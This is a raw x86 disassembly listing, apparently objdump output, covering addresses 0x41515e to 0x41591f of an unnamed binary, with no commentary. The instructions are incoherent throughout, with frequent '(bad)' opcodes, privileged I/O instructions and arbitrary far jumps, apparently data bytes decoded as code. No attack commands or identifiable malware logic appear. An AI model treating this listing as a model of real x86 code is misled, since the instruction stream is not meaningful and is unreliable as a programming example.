  41515e:	ins    BYTE PTR es:[edi],dx
  41515f:	mov    al,al
  415161:	add    BYTE PTR [eax],al
  415163:	vpsrlq xmm0,xmm0,XMMWORD PTR [ebx+0x13a6ce7f]
  41516b:	je     0x41517a
  41516d:	enter  0x18,0x0
  415171:	adc    BYTE PTR [ebx-0x584fa19e],ah
  415177:	je     0x415173
  415179:	inc    BYTE PTR [eax]
  41517b:	mov    al,BYTE PTR [eax]
  41517d:	add    BYTE PTR ds:0x7edcfce7,cl
  415183:	into   
  415184:	mov    eax,0xd05e97e7
  415189:	jmp    0xa6353ac3
  41518e:	cmc    
  41518f:	add    DWORD PTR [ecx],esi
  415191:	mov    gs:0x84067,eax
  415197:	add    BYTE PTR [eax+0x47],dl
  41519a:	add    bh,ah
  41519c:	add    BYTE PTR [eax],al
  41519e:	fsubr  DWORD PTR [edi+esi*2]
  4151a1:	mov    edx,0xb3bd81e3
  4151a6:	lods   eax,DWORD PTR ds:[esi]
  4151a7:	add    al,0xcf
  4151a9:	add    BYTE PTR [eax],al
  4151ab:	adc    ch,BYTE PTR [edx+0x3690d4f8]
  4151b1:	add    al,0x4b
  4151b3:	add    BYTE PTR [eax],al
  4151b5:	xchg   ah,dl
  4151b7:	lods   eax,DWORD PTR ds:[esi]
  4151b8:	popw   es
  4151ba:	fld    DWORD PTR [edx-0x3db26ffb]
  4151c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151c1:	in     eax,0xb4
  4151c3:	neg    DWORD PTR [esi+0x673c4693]
  4151c9:	push   cs
  4151ca:	pop    ebx
  4151cb:	ficom  WORD PTR [eax+0xedc0]
  4151d1:	mov    ebp,0xefa26e2
  4151d6:	fwait
  4151d7:	test   cl,dh
  4151d9:	add    BYTE PTR [eax],al
  4151db:	xchg   esp,esi
  4151dd:	iret   
  4151de:	jns    0x415186
  4151e0:	mov    esp,0xdfc49413
  4151e5:	add    BYTE PTR [eax],al
  4151e7:	xor    DWORD PTR [esi+eiz*2],esi
  4151ea:	push   ebp
  4151eb:	mov    eax,DWORD PTR ds:0x440
  4151f1:	jo     0x415249
  4151f3:	(bad)  
  4151f4:	jne    0x415207
  4151f6:	xchg   DWORD PTR [edx+0x13],eax
  4151f9:	sub    al,BYTE PTR [edi]
  4151fb:	xor    eax,0xb3e06b7f
  415200:	mov    bh,0x5a
  415202:	imul   ecx,DWORD PTR [eax+0x63],0x0
  415206:	add    BYTE PTR [edi+0x7f],bh
  415209:	cld    
  41520a:	test   al,0xfc
  41520c:	xor    esp,ebp
  41520e:	push   ebp
  41520f:	sbb    eax,0xc00298d0
  415214:	sahf   
  415215:	add    BYTE PTR [eax],al
  415217:	mov    esi,0x6de74ac3
  41521c:	not    ah
  41521e:	test   DWORD PTR [ebp+0x893b122],0xad0000a5
  415228:	mov    ecx,0x60585f31
  41522d:	fsub   QWORD PTR [edx-0x6e0215ac]
  415233:	dec    esp
  415234:	loope  0x415236
  415236:	add    BYTE PTR [eax+0x24],al
  415239:	add    BYTE PTR [eax],al
  41523b:	mov    DWORD PTR [edx+edi*1+0x25],ebp
  41523f:	repnz dec edx
  415241:	lock mov edx,0x49a5c33a
  415247:	jmp    0x13dc:0x5f77a856
  41524e:	sti    
  41524f:	mov    ah,0x51
  415251:	sub    DWORD PTR [ebx+0x6f26a2b3],ecx
  415257:	or     ah,ch
  415259:	xor    al,0x57
  41525b:	pop    ebp
  41525c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41525d:	sar    DWORD PTR [esp+ecx*1],1
  415260:	loop   0x415262
  415262:	add    BYTE PTR [edi+0x6cbda8a0],bh
  415268:	xor    BYTE PTR [esi+0x6b],cl
  41526b:	cli    
  41526c:	mov    ?,WORD PTR ds:0x61ade237
  415272:	ins    BYTE PTR es:[edi],dx
  415273:	mov    ds:0x6bedcece,eax
  415278:	push   0x39
  41527a:	sahf   
  41527b:	sub    eax,0xae6ec115
  415280:	mov    edx,0xc902f01f
  415285:	sbb    DWORD PTR ds:[edx-0x7],edi
  415289:	sbb    bl,dl
  41528b:	xor    cl,BYTE PTR [bp+di]
  41528e:	xchg   ebx,eax
  41528f:	loop   0x41521f
  415291:	xor    BYTE PTR [ebx],0x0
  415294:	add    BYTE PTR [ecx+ecx*8],ch
  415297:	jo     0x41521a
  415299:	addr16 int 0xcd
  41529c:	mov    ds:0x83646de8,al
  4152a1:	int    0x2f
  4152a3:	inc    esp
  4152a4:	and    eax,DWORD PTR [eax]
  4152a6:	add    BYTE PTR [ecx],al
  4152a8:	rcr    DWORD PTR [ecx+0x5c00],1
  4152ae:	mov    edx,0xc008dc
  4152b3:	add    BYTE PTR [edx],bl
  4152b5:	xchg   ecx,eax
  4152b6:	and    BYTE PTR ds:0xe681,bl
  4152bb:	sbb    eax,0x9f2afa7c
  4152c0:	std    
  4152c1:	mov    al,0x83
  4152c3:	fadd   DWORD PTR [esi+0x1a]
  4152c6:	popa   
  4152c7:	je     0x415304
  4152c9:	int    0xb5
  4152cb:	ds icebp 
  4152cd:	inc    edi
  4152ce:	mov    ah,0x41
  4152d0:	cmp    BYTE PTR [ecx],ch
  4152d2:	or     DWORD PTR [edi+0x19],esi
  4152d5:	dec    eax
  4152d6:	sbb    BYTE PTR [eax],al
  4152d8:	add    BYTE PTR [edi],al
  4152da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152db:	cwde   
  4152dc:	cmp    esi,DWORD PTR [eiz*1-0x1e276141]
  4152e3:	bound  ecx,QWORD PTR [eax-0x5b]
  4152e6:	add    BYTE PTR [eax],al
  4152e8:	ret    
  4152e9:	adc    eax,0x1db3ee54
  4152ee:	sbb    BYTE PTR [eax],dl
  4152f0:	xor    al,0x87
  4152f2:	jle    0x4152d8
  4152f4:	adc    dl,dh
  4152f6:	mov    ah,0xca
  4152f8:	cmp    DWORD PTR ds:0x4e37295e,edi
  4152fe:	fcmovu st,st(4)
  415300:	fnsave [esi+0x3e1a4111]
  415306:	in     eax,dx
  415307:	adc    BYTE PTR [ebx-0xaf90000],0x6e
  41530e:	and    DWORD PTR [ebx+eax*4],esp
  415311:	dec    ebp
  415312:	pcmpgtw mm6,mm7
  415315:	mov    eax,0x38e2fc22
  41531a:	mov    edx,0xc307c64d
  41531f:	sbb    bh,cl
  415321:	icebp  
  415322:	jnp    0x4152f5
  415324:	mov    ebx,0x889e58a
  415329:	add    BYTE PTR gs:[eax],al
  41532c:	stc    
  41532d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41532e:	sub    esi,0x44
  415331:	jno    0x415333
  415333:	add    BYTE PTR [ebx],al
  415335:	cmp    cl,BYTE PTR [eax]
  415337:	lea    eax,[eax]
  415339:	add    BYTE PTR [edx-0x3dd006c8],bh
  41533f:	pop    es
  415340:	rol    edi,cl
  415342:	adc    eax,0xda84f2
  415347:	add    BYTE PTR [esi+0x3e3f33b0],bh
  41534d:	imul   edi,DWORD PTR [esi+0x55861563],0x93503c71
  415357:	jno    0x415323
  415359:	dec    esi
  41535a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41535b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41535c:	mov    bl,0xc6
  41535e:	sbb    esp,DWORD PTR [ebx-0x2b]
  415361:	dec    esp
  415362:	add    DWORD PTR [eax],0x0
  415365:	or     bh,BYTE PTR [edi-0x61]
  415368:	cdq    
  415369:	jg     0x415311
  41536b:	std    
  41536c:	loop   0x4153e3
  41536e:	and    BYTE PTR [ecx-0x3fdf383f],al
  415374:	xor    BYTE PTR [eax],al
  415376:	add    BYTE PTR [ecx+ebx*8-0x62],bh
  41537a:	rcl    DWORD PTR [edx+0x22],0x8a
  41537e:	sbb    dh,cl
  415380:	dec    ebp
  415381:	dec    ebx
  415382:	inc    ebp
  415383:	(bad)  
  415384:	jnp    0x415361
  415386:	jae    0x415346
  415388:	sbb    eax,0xe877b2e
  41538d:	jmp    0x970b:0x6b05c9b
  415394:	pop    es
  415395:	ins    DWORD PTR es:[edi],dx
  415396:	(bad)  
  415397:	ins    DWORD PTR es:[edi],dx
  415398:	dec    edx
  415399:	(bad)  
  41539b:	ins    BYTE PTR es:[edi],dx
  41539c:	clc    
  41539d:	pop    DWORD PTR [esi-0x68]
  4153a0:	fisttp QWORD PTR [ecx+edx*2]
  4153a3:	add    BYTE PTR [eax],al
  4153a5:	stos   BYTE PTR es:[edi],al
  4153a6:	(bad)  
  4153a7:	push   ebp
  4153a8:	ss sbb eax,0x380c
  4153ae:	mov    ch,0x17
  4153b0:	sub    DWORD PTR [ebx-0x80],esp
  4153b3:	lock add BYTE PTR [eax],al
  4153b6:	inc    edi
  4153b7:	adc    BYTE PTR [ecx],0x1
  4153ba:	jns    0x4153ae
  4153bc:	sub    esi,DWORD PTR [ebp-0x73]
  4153bf:	daa    
  4153c0:	fnsave [esi+ebp*1+0x14b0ea20]
  4153c7:	(bad)  
  4153c8:	int    0x70
  4153ca:	pop    ecx
  4153cb:	call   0xd450:0xcbc2befc
  4153d2:	loope  0x4153ec
  4153d4:	in     eax,dx
  4153d5:	mov    bl,0x8d
  4153d7:	leave  
  4153d8:	(bad)  
  4153d9:	gs pop ds
  4153db:	call   0xaa8c:0x2d5563f9
  4153e2:	add    BYTE PTR [eax],al
  4153e4:	or     eax,0x71516ef8
  4153e9:	test   al,0x71
  4153eb:	xor    eax,DWORD PTR [ebp+0x38cf5af9]
  4153f1:	sbb    DWORD PTR [eax-0x2b26b2b5],esi
  4153f7:	xlat   BYTE PTR ds:[ebx]
  4153f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153f9:	aas    
  4153fa:	or     ch,ch
  4153fc:	add    BYTE PTR [eax],al
  4153fe:	adc    DWORD PTR [eax-0xe],0x57484e
  415405:	add    BYTE PTR [eax],cl
  415407:	jle    0x415409
  415409:	add    BYTE PTR [edx],dl
  41540b:	fadd   QWORD PTR [esi]
  41540d:	dec    esp
  41540e:	add    BYTE PTR [bx+si],al
  415411:	cdq    
  415412:	stos   BYTE PTR es:[edi],al
  415413:	cmp    bh,BYTE PTR [esi+0x6b450ea2]
  415419:	lds    esp,FWORD PTR [ebx]
  41541b:	sahf   
  41541c:	sub    DWORD PTR [eax],eax
  41541e:	bound  eax,QWORD PTR [eax]
  415420:	add    BYTE PTR [edx],bl
  415422:	fs pop esi
  415424:	xchg   esp,eax
  415425:	jle    0x415471
  415427:	ret    
  415428:	cmp    BYTE PTR [edi+0x631eb360],bl
  41542e:	jecxz  0x415401
  415430:	scas   eax,DWORD PTR es:[edi]
  415431:	pop    ebp
  415432:	imul   esi,DWORD PTR [esi+0x6ac4de],0x67d32c00
  41543c:	and    al,0xfc
  41543e:	stos   BYTE PTR es:[edi],al
  41543f:	pushf  
  415440:	jge    0x4154b7
  415442:	es xor al,0xd2
  415445:	sar    DWORD PTR [edi+0x36790360],cl
  41544b:	leave  
  41544c:	push   esi
  41544d:	and    bl,BYTE PTR ss:[esi-0x84e803d]
  415454:	out    dx,eax
  415455:	adc    al,0x7d
  415457:	nop
  415458:	jb     0x4154bc
  41545a:	mov    ds:0x1ccc7cb4,eax
  41545f:	add    BYTE PTR [eax],al
  415461:	pop    es
  415462:	jae    0x415460
  415464:	das    
  415465:	add    al,0x25
  415467:	add    BYTE PTR [eax],al
  415469:	adc    edx,DWORD PTR [edx+edi*8+0x437479cf]
  415470:	pop    esi
  415471:	rcl    DWORD PTR [eax-0x1bce5287],1
  415477:	jae    0x4154a4
  415479:	inc    eax
  41547a:	jno    0x41547c
  41547c:	add    dl,ch
  41547e:	push   edx
  41547f:	jmp    0x41549b
  415481:	jmp    0x41549d
  415483:	les    esp,FWORD PTR [ecx+0x0]
  415486:	add    BYTE PTR [edi+ebx*8],bh
  415489:	pop    eax
  41548a:	out    0x60,al
  41548c:	cmp    eax,0xae091a6b
  415491:	adc    DWORD PTR [edx],0xffffffd8
  415494:	push   ss
  415495:	js     0x415515
  415497:	xchg   eax,esi
  415499:	and    dh,BYTE PTR [ecx-0x3fd6e08e]
  41549f:	sub    eax,0xabfd0000
  4154a4:	loop   0x4154bc
  4154a6:	sub    BYTE PTR ds:0xa3150000,0xb9
  4154ad:	sbb    eax,0x6949765e
  4154b2:	or     ebp,DWORD PTR [edx+0x78]
  4154b5:	div    edx
  4154b7:	ins    BYTE PTR es:[edi],dx
  4154b8:	sub    al,0x29
  4154ba:	pop    esp
  4154bb:	loop   0x41544f
  4154bd:	fnstenv [ebx-0x49]
  4154c0:	mov    ch,0xb9
  4154c2:	xchg   BYTE PTR [esi-0x78],ah
  4154c5:	cwde   
  4154c6:	add    BYTE PTR [eax],al
  4154c8:	pop    eax
  4154c9:	jge    0x4154c9
  4154cb:	(bad)  
  4154cc:	das    
  4154cd:	push   esp
  4154ce:	call   0xc969:0xa5707c16
  4154d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154d6:	test   DWORD PTR [esi-0x4f2af6b],edx
  4154dc:	sub    BYTE PTR [ebp+0x16],cl
  4154df:	jb     0x4154a1
  4154e1:	dec    edi
  4154e2:	add    BYTE PTR [eax],al
  4154e4:	xlat   BYTE PTR ds:[ebx]
  4154e5:	jp     0x415550
  4154e7:	push   ebp
  4154e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154e9:	out    dx,al
  4154ea:	lahf   
  4154eb:	jmp    0x4154be
  4154ed:	sbb    bh,BYTE PTR [esi-0x1f]
  4154f0:	fsub   DWORD PTR [esi+0x7c2cd82c]
  4154f6:	xchg   ebx,eax
  4154f7:	mov    bl,0x11
  4154f9:	xchg   edi,eax
  4154fa:	sub    bl,0x7b
  4154fd:	iret   
  4154fe:	out    dx,al
  4154ff:	out    dx,eax
  415500:	sbb    ch,ch
  415502:	cli    
  415503:	lods   al,BYTE PTR ds:[esi]
  415504:	fs xchg esi,eax
  415506:	mov    WORD PTR [eax],gs
  415508:	add    BYTE PTR [eax],al
  41550a:	ins    DWORD PTR es:[edi],dx
  41550b:	push   cs
  41550c:	mov    ecx,DWORD PTR [ecx]
  41550e:	push   ecx
  41550f:	enter  0xda,0x0
  415513:	mov    edi,0x4d0c34
  415518:	add    BYTE PTR [eax],ah
  41551a:	fsubr  st,st(1)
  41551c:	mov    WORD PTR [ebx],ds
  41551e:	add    BYTE PTR [eax],al
  415520:	mov    ch,0x3d
  415522:	mov    WORD PTR [eax+0x0],?
  415525:	add    dh,dh
  415527:	out    dx,eax
  415528:	enter  0x65,0x0
  41552c:	push   esp
  41552d:	pop    edi
  41552e:	aas    
  41552f:	(bad)  
  415530:	mov    bh,0x92
  415532:	mov    dl,0xc9
  415535:	pop    esi
  415536:	inc    edi
  415537:	push   es
  415538:	test   BYTE PTR [ecx+0x0],bh
  41553b:	add    bl,dh
  41553d:	mov    DWORD PTR [eiz*2-0x74250000],ecx
  415544:	mov    esp,edx
  415546:	rcr    cl,cl
  415548:	je     0x41558b
  41554a:	shl    DWORD PTR [edi+0x44286d0d],1
  415550:	jne    0x415552
  415552:	add    BYTE PTR [ebp-0x4e14a34d],ch
  415558:	jnp    0x415564
  41555a:	gs (bad) 
  41555d:	pop    edx
  41555e:	xlat   BYTE PTR ds:[ebx]
  41555f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415560:	inc    ebp
  415561:	scas   eax,DWORD PTR es:[edi]
  415562:	in     eax,dx
  415563:	push   0x66
  415565:	push   edi
  415566:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415567:	int    0xa9
  415569:	sbb    BYTE PTR [ebx],0xe2
  41556c:	out    0xa0,eax
  41556e:	das    
  41556f:	add    eax,0x8c095c32
  415574:	test   BYTE PTR [eax],0x0
  415577:	(bad)  
  415578:	xor    ecx,edx
  41557a:	loope  0x415598
  41557c:	sbb    eax,0xec913fe
  415581:	adc    dh,bl
  415583:	add    ah,BYTE PTR [eax+0x2c24a951]
  415589:	push   ecx
  41558a:	mov    dh,0x6f
  41558c:	les    esi,FWORD PTR [edi]
  41558e:	add    BYTE PTR [eax],al
  415590:	jmp    0xf8a9:0xae47339c
  415597:	inc    ecx
  415598:	enter  0xba,0x0
  41559c:	add    DWORD PTR [eax+0xb],0x66990000
  4155a3:	pop    edi
  4155a4:	icebp  
  4155a5:	aad    0xb1
  4155a7:	and    esp,esp
  4155a9:	jp     0x415532
  4155ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155ac:	lea    ebp,es:[esi-0x7f]
  4155b0:	bound  esp,QWORD PTR [ebx+0x1f]
  4155b3:	ret    
  4155b4:	jnp    0x415581
  4155b6:	xchg   DWORD PTR ds:0x1cbe5838,esp
  4155bc:	sbb    DWORD PTR [eax-0x18],eax
  4155bf:	add    BYTE PTR [eax],al
  4155c1:	(bad)  
  4155c3:	push   ebx
  4155c4:	cs enter 0xcd,0x0
  4155c9:	in     al,0x86
  4155cb:	daa    
  4155cc:	add    al,0xfc
  4155ce:	add    BYTE PTR [eax],al
  4155d0:	add    eax,0xca469726
  4155d5:	push   edi
  4155d6:	loop   0x415636
  4155d8:	sar    BYTE PTR [edi],cl
  4155da:	int3   
  4155db:	or     DWORD PTR [eax],eax
  4155dd:	add    BYTE PTR [ecx-0x3f0944e9],al
  4155e3:	pop    ebx
  4155e4:	add    BYTE PTR [eax],al
  4155e6:	rcr    BYTE PTR [esi+0xeb44ad],cl
  4155ec:	add    BYTE PTR [edi],cl
  4155ee:	dec    esi
  4155ef:	xchg   edx,eax
  4155f0:	loopne 0x4155e3
  4155f2:	adc    dl,BYTE PTR [esi+0x49]
  4155f5:	call   0xba2cf810
  4155fa:	sub    eax,DWORD PTR [ebx+0x307e52d6]
  415600:	push   cs
  415601:	add    al,0xb
  415603:	add    BYTE PTR [eax],al
  415605:	loope  0x415671
  415607:	cmp    BYTE PTR ds:0xc2d83692,al
  41560d:	jmp    0x290fbab8
  415612:	xchg   edx,eax
  415613:	(bad)  
  415614:	imul   eax,DWORD PTR ds:0xdd410fc1,0x2c032cab
  41561e:	call   0x9491:0x8e3fc350
  415625:	mov    eax,ds:0x2584
  41562a:	sti    
  41562b:	ds pusha 
  41562d:	cmc    
  41562e:	xchg   esi,eax
  41562f:	cs jl  0x4155bb
  415632:	std    
  415633:	mov    edi,0xacf7d37a
  415638:	pop    esi
  415639:	inc    esp
  41563a:	inc    DWORD PTR [eax]
  41563c:	add    dl,dh
  41563e:	sar    DWORD PTR [eax],cl
  415640:	out    0xde,al
  415642:	sub    al,0x4f
  415644:	(bad)  
  415645:	stc    
  415646:	jmp    0x22464caf
  41564b:	add    BYTE PTR [eax],al
  41564d:	and    esi,DWORD PTR [edx-0x5a]
  415650:	fcomip st,st(4)
  415652:	or     ah,dl
  415654:	sub    edx,DWORD PTR [edi+0xe]
  415657:	sbb    DWORD PTR [edx-0x1be3896e],ebp
  41565d:	ret    0x9fd3
  415660:	jno    0x4156ac
  415662:	push   ss
  415663:	dec    edx
  415664:	test   DWORD PTR ds:0xb7c4b7,0xf37ba500
  41566e:	adc    eax,0x8f2209be
  415673:	outs   dx,DWORD PTR ds:[esi]
  415674:	fisttp WORD PTR [eax]
  415676:	sldt   WORD PTR [eax]
  415679:	inc    ecx
  41567a:	pop    eax
  41567b:	les    ebx,FWORD PTR [edi]
  41567d:	add    BYTE PTR [eax],al
  41567f:	neg    BYTE PTR [edi+0x7231d0a5]
  415685:	outs   dx,DWORD PTR ds:[esi]
  415686:	jmp    0x6439:0x70cb7f90
  41568d:	sahf   
  41568e:	pop    ss
  41568f:	cmp    BYTE PTR [edx],ch
  415691:	stos   BYTE PTR es:[edi],al
  415692:	xor    al,0x5a
  415694:	lds    edx,FWORD PTR [ebp+0x25b2ea36]
  41569a:	inc    edx
  41569b:	inc    ecx
  41569c:	xor    ebp,ebp
  41569e:	ins    DWORD PTR es:[edi],dx
  41569f:	sahf   
  4156a0:	xor    BYTE PTR [esi+0xa644],bl
  4156a6:	ds xchg esi,eax
  4156a8:	jmp    0xa6e9:0x2d5a91c5
  4156af:	fdiv   st,st(6)
  4156b1:	mov    eax,ds:0xea00fd66
  4156b6:	add    BYTE PTR [eax],al
  4156b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156b9:	sub    BYTE PTR [ebp-0x3999c94d],ah
  4156bf:	jl     0x4156c8
  4156c1:	pop    ss
  4156c2:	jmp    0x78889bce
  4156c7:	sbb    ch,BYTE PTR [edi+0x23e3720f]
  4156cd:	jg     0x4156a3
  4156cf:	push   0x4
  4156d1:	retf   
  4156d2:	add    BYTE PTR [eax],al
  4156d4:	xor    BYTE PTR [eax-0x15],al
  4156d7:	add    BYTE PTR [eax],al
  4156d9:	jecxz  0x41565e
  4156db:	fstp   TBYTE PTR [edx-0x25]
  4156de:	(bad)  
  4156df:	xchg   edi,eax
  4156e0:	je     0x415749
  4156e2:	or     BYTE PTR [eax+0x0],0x0
  4156e6:	fs xor al,0x4
  4156e9:	adc    DWORD PTR [eax],eax
  4156eb:	add    BYTE PTR [ebx+edx*2],cl
  4156ee:	add    BYTE PTR [eax],al
  4156f0:	xlat   BYTE PTR ds:[ebx]
  4156f2:	cmp    al,0x57
  4156f4:	jmp    0x415763
  4156f6:	repz jns 0x41569b
  4156f9:	cmc    
  4156fa:	imul   esi,DWORD PTR [ebx+0x51],0xffffffda
  4156fe:	fidivr WORD PTR [esi]
  415700:	xlat   BYTE PTR ds:[ebx]
  415701:	out    dx,eax
  415702:	add    dh,bl
  415704:	ret    
  415705:	cmp    ch,BYTE PTR [edx]
  415707:	adc    cl,al
  415709:	or     al,BYTE PTR [eax]
  41570b:	add    BYTE PTR [ebx+esi*1],dl
  41570e:	in     eax,dx
  41570f:	push   ds
  415710:	xor    eax,0xd64de723
  415715:	sub    BYTE PTR [ebp+0x19],dh
  415718:	pop    edi
  415719:	adc    DWORD PTR [ecx-0x527300b7],esi
  41571f:	add    BYTE PTR [eax],al
  415721:	shr    DWORD PTR [edx+ebx*2-0xb],1
  415725:	adc    DWORD PTR [edx+esi*8-0x6e],0x65
  41572a:	mov    DWORD PTR [eax+0x3e0000ca],eax
  415730:	mov    eax,ds:0x69747582
  415735:	leave  
  415736:	mov    ch,0x14
  415738:	and    esp,DWORD PTR [ebx-0x24627a0]
  41573e:	mov    ds:0x81febdc2,eax
  415743:	mov    WORD PTR [ebp+0x0],gs
  415746:	add    BYTE PTR [ebx+0x52d7d0ca],ah
  41574c:	inc    edx
  41574d:	and    eax,0x47b376b4
  415752:	sbb    BYTE PTR [edi+0x5fc4e0],cl
  415758:	add    BYTE PTR [edx+0x761119df],dh
  41575e:	adc    bl,0x0
  415761:	add    BYTE PTR [edi+0xd404d5],dl
  415767:	add    BYTE PTR [ebx+0x30f8b0e6],bh
  41576d:	and    bl,bl
  41576f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415770:	cmp    eax,0xd1145d1d
  415775:	icebp  
  415776:	rep outs dx,BYTE PTR ds:[esi]
  415778:	pop    DWORD PTR cs:[eax-0x38]
  41577c:	add    BYTE PTR [eax],al
  41577e:	mov    edi,0x75ea3143
  415783:	je     0x4157e9
  415785:	loopne 0x4157be
  415787:	sub    DWORD PTR [eax-0x45],edi
  41578a:	data16 mov ds:0x1a4c1f,al
  415790:	add    BYTE PTR [esi-0x32f5f80f],dl
  415796:	daa    
  415797:	push   ss
  415798:	or     dh,al
  41579a:	add    BYTE PTR [eax],al
  41579c:	xchg   ebx,eax
  41579d:	dec    ebp
  41579e:	popa   
  41579f:	rcl    DWORD PTR [ebx+0x5696b53d],0x36
  4157a6:	aam    0xec
  4157a8:	xlat   BYTE PTR ds:[ebx]
  4157a9:	setae  BYTE PTR [ecx-0x35e7f2b1]
  4157b0:	sahf   
  4157b1:	sahf   
  4157b2:	xor    BYTE PTR [eax+0x52],ah
  4157b5:	cmp    al,0x20
  4157b7:	inc    ebp
  4157b8:	pop    edi
  4157b9:	test   BYTE PTR [edx],dh
  4157bb:	add    BYTE PTR [eax],al
  4157bd:	sbb    al,0xc6
  4157bf:	std    
  4157c0:	xchg   edi,eax
  4157c1:	mov    bh,BYTE PTR [esi+0x183893a6]
  4157c7:	xchg   edi,eax
  4157c8:	dec    eax
  4157c9:	pop    ebp
  4157ca:	add    BYTE PTR [eax],al
  4157cc:	out    dx,al
  4157cd:	ret    0x2c87
  4157d0:	mov    dh,0x5e
  4157d2:	cs in  eax,dx
  4157d4:	loope  0x4157b0
  4157d6:	rol    BYTE PTR [edx],0x0
  4157d9:	add    dl,ah
  4157db:	setp   al
  4157de:	sahf   
  4157df:	add    BYTE PTR [eax],al
  4157e1:	xchg   edx,eax
  4157e2:	psubsb mm2,QWORD PTR [ebx+0x12de4336]
  4157e9:	dec    ecx
  4157ea:	(bad)  
  4157eb:	cli    
  4157ec:	xchg   ecx,eax
  4157ed:	dec    ecx
  4157ee:	dec    edi
  4157ef:	lahf   
  4157f0:	jge    0x4157a8
  4157f2:	sub    al,0xb6
  4157f4:	mov    bl,0xc7
  4157f6:	frstor [edx+edi*2]
  4157f9:	outs   dx,DWORD PTR ds:[esi]
  4157fa:	jb     0x415809
  4157fc:	sub    al,0x7
  4157fe:	push   es
  4157ff:	nop
  415800:	in     eax,dx
  415801:	and    BYTE PTR [ecx-0x5d],ch
  415804:	cmp    BYTE PTR [ebx+ecx*8-0x3],ch
  415808:	fimul  WORD PTR [ecx+0x2a03ca65]
  41580e:	adc    ah,BYTE PTR [edx-0x3d]
  415811:	jp     0x415865
  415813:	jmp    0x9f:0xf83dd8ab
  41581a:	mov    eax,ds:0x89f60000
  41581f:	in     al,0xa5
  415821:	and    BYTE PTR [eax+0x4d],dh
  415824:	out    dx,al
  415825:	xchg   ebx,eax
  415826:	clc    
  415827:	and    eax,0x404
  41582c:	sub    ecx,DWORD PTR [ebx-0x3cd82948]
  415832:	jo     0x4157dd
  415834:	and    BYTE PTR [ecx+0x63],ah
  415837:	dec    eax
  415838:	add    DWORD PTR [eax],eax
  41583a:	add    BYTE PTR [esi],al
  41583c:	mov    eax,0xbc88
  415841:	hlt    
  415842:	adc    al,bl
  415844:	or     esp,DWORD PTR [edi+0x55]
  415847:	jnp    0x415811
  415849:	cmp    al,0x0
  41584b:	add    BYTE PTR [edi],al
  41584d:	(bad)  
  41584e:	enter  0x55,0x0
  415852:	sbb    dl,BYTE PTR [edx]
  415854:	cmp    cl,BYTE PTR [eax]
  415856:	lock add BYTE PTR [eax],al
  415859:	(bad)  
  41585b:	mov    esp,0xbc755671
  415860:	rol    edi,0x2a
  415863:	push   eax
  415864:	sbb    dh,BYTE PTR [edi-0x37]
  415867:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415868:	pop    ds
  415869:	pushf  
  41586a:	pop    esi
  41586b:	into   
  41586c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41586d:	jns    0x415819
  41586f:	pushf  
  415870:	dec    esi
  415871:	in     al,dx
  415872:	in     eax,dx
  415873:	xchg   BYTE PTR [edx],cl
  415875:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415876:	retf   
  415877:	cmp    eax,0x72641670
  41587c:	test   DWORD PTR [edi+0x46c333e6],edi
  415882:	xor    al,0x42
  415884:	xchg   ecx,eax
  415885:	xor    DWORD PTR ds:0x448c8297,esi
  41588b:	add    BYTE PTR [eax],al
  41588d:	sti    
  41588e:	and    dh,BYTE PTR [edx+0x6dc81696]
  415894:	add    BYTE PTR [eax],al
  415896:	inc    eax
  415897:	rol    DWORD PTR [eax],0x0
  41589a:	cmp    ah,BYTE PTR [esi-0x5b3be168]
  4158a0:	add    BYTE PTR [eax],al
  4158a2:	push   esi
  4158a3:	jp     0x4158ec
  4158a5:	dec    ebp
  4158a6:	mov    bl,0x5c
  4158a8:	scas   al,BYTE PTR es:[edi]
  4158a9:	mov    eax,0x38fcbbec
  4158ae:	aaa    
  4158af:	neg    eax
  4158b1:	mov    DWORD PTR [edi+0x7101d368],ebp
  4158b7:	aad    0x62
  4158b9:	test   BYTE PTR cs:[ecx+0x27ac2564],0x39
  4158c1:	cs fwait
  4158c3:	xchg   esp,eax
  4158c4:	xchg   esp,eax
  4158c5:	in     eax,0x25
  4158c7:	inc    esi
  4158c8:	popa   
  4158c9:	cmovl  ebx,ebp
  4158cc:	add    BYTE PTR [eax],al
  4158ce:	in     al,dx
  4158cf:	mov    al,ds:0x840f14e2
  4158d4:	pop    ss
  4158d5:	add    BYTE PTR [eax],al
  4158d7:	adc    DWORD PTR [ecx],ebp
  4158d9:	mov    eax,ds:0x341a9d28
  4158de:	xor    al,0x2f
  4158e0:	in     al,dx
  4158e1:	sahf   
  4158e2:	shr    BYTE PTR ds:0x9e0dd032,cl
  4158e8:	stc    
  4158e9:	inc    eax
  4158ea:	lock add BYTE PTR [eax],al
  4158ed:	sub    al,0x37
  4158ef:	(bad)  
  4158f0:	pop    ds
  4158f1:	repnz in al,0xfe
  4158f4:	jg     0x41595d
  4158f6:	add    BYTE PTR [eax],bh
  4158f8:	add    BYTE PTR [eax],al
  4158fa:	add    BYTE PTR [edi-0x7e180000],ah
  415900:	lods   eax,DWORD PTR ds:[esi]
  415901:	int3   
  415902:	add    BYTE PTR [eax],al
  415904:	add    BYTE PTR [esi+edx*1-0x7e],ch
  415908:	adc    eax,0xa5f92b85
  41590d:	inc    eax
  41590e:	pop    esp
  41590f:	add    BYTE PTR [eax],al
  415911:	jno    0x41598e
  415913:	xor    esp,edi
  415915:	adc    al,0xc5
  415917:	fidiv  WORD PTR [ebx]
  415919:	dec    ebx
  41591a:	inc    ebx
  41591b:	xchg   ecx,eax
  41591c:	(bad)  
  41591d:	leave  
  41591e:	nop
  41591f:	pop    edi
